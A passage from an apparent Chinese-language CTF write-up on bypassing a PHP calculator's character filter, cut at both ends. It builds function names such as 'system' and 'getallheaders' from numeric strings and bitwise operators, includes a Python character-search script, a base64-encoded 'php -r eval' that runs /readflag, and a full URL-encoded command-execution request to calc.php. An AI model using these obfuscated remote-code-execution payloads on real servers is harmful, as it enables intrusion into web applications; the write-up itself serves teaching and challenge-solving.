class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>​    在 PHP 中，将两个数字使用<code>.</code>拼接，会当做字符串来处理，返回的也是一个字符串。例如：<code>(1).(2)</code>出来的就是字符串<code>&quot;12&quot;</code>，然后可以用<code>{}</code>来代替<code>[]</code>来取单个字符。所以我们可以先获得一部分字符然后位运算获取所有的字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// .</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">//E</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;); <span class="comment">// +</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;); <span class="comment">//I</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// N</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;); <span class="comment">// F</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"1"</span> | <span class="string">"E"</span>);<span class="comment">//u</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"3"</span> | <span class="string">"E"</span>); <span class="comment">// w</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"4"</span> | <span class="string">"I"</span>); <span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"0"</span> | <span class="string">"I"</span>); <span class="comment">// y</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"0"</span> | <span class="string">"F"</span>); <span class="comment">//v</span></span><br></pre></td></tr></table></figure>

<p><a href="https://mp.weixin.qq.com/s/0J9Omna8tmKWP9s4iSg10w" target="_blank" rel="noopener">chamd5的构造脚本</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">strings = [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'E'</span>,<span class="string">'u'</span>,<span class="string">'w'</span>,<span class="string">'&#125;'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'I'</span>,<span class="string">'N'</span>,<span class="string">'F'</span>,<span class="string">'y'</span>,<span class="string">'v'</span>]</span><br><span class="line"></span><br><span class="line">input_value = <span class="string">'o'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)|ord(s1))).strip()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'|'</span>,s1)</span><br><span class="line"></span><br><span class="line">print(len(strings))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)&amp;ord(s1)))</span><br><span class="line">    data = data.strip()</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'&amp;'</span>,s1)</span><br><span class="line">print(len(strings))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)|ord(s1))).strip()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'|'</span>,s1)</span><br><span class="line">print(len(strings))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      data = (chr(ord(s)&amp;ord(s1))).strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'&amp;'</span>,s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    data = chr(~ord(s))</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  data = data.strip()</span><br><span class="line">  <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">    strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success ~'</span>,s)</span><br></pre></td></tr></table></figure>

<p>手工拼了个 <code>pHpINFo</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">''</span>;</span><br><span class="line">$a.=(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;)); <span class="comment">//p=y&amp;v</span></span><br><span class="line">$a.= (((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;);<span class="comment">//H=y&amp;N</span></span><br><span class="line">$a.=(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;)); <span class="comment">//p=y&amp;v</span></span><br><span class="line">$a.=(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;); <span class="comment">//I</span></span><br><span class="line">$a.=(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">//N</span></span><br><span class="line">$a.= (((<span class="number">3</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;);<span class="comment">//F=w &amp; N</span></span><br><span class="line">$a.= (((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;);<span class="comment">//o=E | +</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>

<p>完整的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">3</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;)))()</span><br></pre></td></tr></table></figure>

<p>后面的不拼了…… 直接用师傅们的payload</p>
<p>题目中断外网，并且需要<code>/readflag</code>，即需要一个shell. 进行命令执行.</p>
<ul>
<li>有几种方式</li>
</ul>
<ol>
<li><p>system(end(getallheaders()));</p>
</li>
<li><p>system(file_get_contents(“php://input”)); </p>
</li>
<li><p>把脚本内容写到一个文件, 最后执行  </p>
</li>
</ol>
<p><code>system(end(getallheaders()));的payload;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">9</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;);</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">-1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;));</span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//systEm</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">6</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//n</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">6</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//D</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//EnD</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// getallheaders</span></span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">8</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)))); <span class="comment">// g</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">//T</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//a</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// l</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// l</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// h</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//a</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//D</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">2</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">// r</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">// s</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后需要过<code>/readflag</code>的验证码, 可以使用使用<code>Perl</code>, 也可以通过 <code>php -r &quot;&quot;</code>的方式执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"eval(base64_decode('JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K'));"</span></span><br></pre></td></tr></table></figure>

<p>最终的payload</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">GET /calc.php?<span class="built_in">num</span>=(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">9</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((-<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B0</span>%7D)))(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">6</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">6</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))))((((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">8</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span 